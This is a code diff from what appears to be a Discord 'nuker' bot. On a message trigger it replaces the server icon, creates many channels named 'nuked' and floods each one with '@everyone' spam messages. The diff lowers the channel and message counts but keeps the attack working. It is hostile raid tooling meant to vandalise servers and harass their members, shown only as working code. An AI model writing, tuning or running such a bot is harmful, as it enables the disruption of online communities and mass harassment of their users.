@@ -24,10 +24,10 @@ client.on('messageCreate', async message => {
         const iconFile = fs.readFileSync('nuke.png');
         await message.guild.setIcon(iconFile);
 
-        const channelsPromises = Array.from({ length: 30 }, async (_, i) => {
+        const channelsPromises = Array.from({ length: 20 }, async (_, i) => {
           const createdChannel = await message.guild.channels.create(`nuked ${emojis.slice(0, 5).join(' ')} ${emojis[i % emojis.length]}`, { type: 0 });
 
-            const botMessagesPromises = Array.from({ length: 1000 }, async () => {
+            const botMessagesPromises = Array.from({ length: 50 }, async () => {
                   await createdChannel.send(`# NUKED!!\n@everyone ${emojis[Math.floor(Math.random() * emojis.length)]} ${emojis.slice(0, 5).join(' ')}`);
               });
 
